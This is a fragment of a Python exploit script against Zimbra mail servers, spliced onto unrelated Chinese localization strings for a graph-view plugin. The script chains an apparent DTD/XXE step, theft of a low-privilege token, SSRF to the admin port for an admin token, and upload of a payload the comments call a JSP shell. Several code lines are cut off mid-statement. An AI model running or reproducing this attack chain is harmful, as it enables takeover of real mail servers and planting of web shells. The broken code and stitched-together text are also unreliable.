Edg/110.0.1587.63', "Content-Type":"application/xml" } r=requests.post(self.base_url+"/service/soap",data=self.make_xml_auth_body( "urn:zimbraAccount", self.low_auth["username"], self.low_auth["password"] ), headers=headers, verify=False, timeout=15) low_priv_token = self.pattern_auth_token.findall(r.text) if low_priv_token: print("[+] Gathered Low Auth Token.") return low_priv_token[0].strip() print("[-] Failed to get Low Auth Token") return False def ssrf_admin_token(self, low_priv_token): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63', "Content-Type":"application/xml" } headers["Host"]="{}:7071".format(urllib.parse.urlparse(self.base_url).netloc.split(":")[0]) print("[*] Getting Admin Auth Token By SSRF", end="\r") r = self.low_auth["password"] ), verify=False, headers=headers, cookies={"ZM_ADMIN_AUTH_TOKEN":low_priv_token} ) admin_token = self.pattern_auth_token.findall(r.text) if admin_token: print("[+] Gathered Admin Auth Token.") return admin_token[0].strip() print("[-] Failed to get Admin Auth Token") return False def upload_payload(self, admin_token): f = { 'filename1':(None, "whatszimbra", None), 'clientFile':(self.file_name, self.payload, "text/plain"), 'requestId':(None, "12356721-3268-3782", None), } cookies = { "ZM_ADMIN_AUTH_TOKEN":admin_token } print("[*] Uploading file", end="\r") r = requests.post(self.base_url+"/service/extension/clientUploader/upload",files=f, cookies=cookies, verify=False ) if r.status_code == 200: r = requests.get(self.base_url + "/downloads/" + self.file_name, cookies=cookies, verify=False ) if r.status_code != 404: # some jsp shells throw a 500 if invalid parameters are given print("[+] Uploaded file to: Upload File.") return False def exploit(self): try: if self.upload_dtd_payload(): low_auth_token = self.gather_low_auth_token() if low_auth_token: admin_auth_token = self.ssrf_admin_token(low_auth_token) if admin_auth_token: return self.upload_payload(admin_auth_token) except Exception as e: print("Error: {}".format(e)) return False if __name__ == "__main__": '--dtd', action='store', dest='dtd', help='Url to DTD', required=True) parser.add_argument('-n', '--name', action='store', dest='payload_name', help='Name of uploaded payload', required=True) info_allowGlobalGraph.description: 允许用户查看所有节点的全局图。

info_allowExpand.description: 允许用户将图形视图弹出至全屏显示。

info_attractionForce.description: 链接节点之间的吸引力有多大？吸引力越大，图形将显得越集中。

info_linkLength.description: 节点之间的链接应有多长？链接越短，节点将聚集得更紧密。

info_repulsionForce.description: 节点之间的排斥力有多大？排斥力越大，分离的节点将分散得越远。

info_centralForce.description: 节点被吸引到中心的程度有多大？吸引力越大，图形看起来越密集和呈圆形。

info_edgePruning.description: 超过此阈值长度的边将不会显示，但仍然参与图形计算。这有助于大型复杂图形显得更加有序。悬停在节点上时，仍会显示这些链接。

info_minNodeRadius.description: 最小节点的大小是多少？节点越小，吸引其他节点的力量越小。

info_maxNodeRadius.description: 最大节点的大小是多少？节点大小取决于它们的链接数量。节点越大，吸引其他节点的力量越大。这有助于围绕最重要的节点形成良好的分组。

info_allowResizing.description: 是否允许用户调整侧边栏的大小

info_allowCollapsing.description: 是否允许用户折叠侧边栏
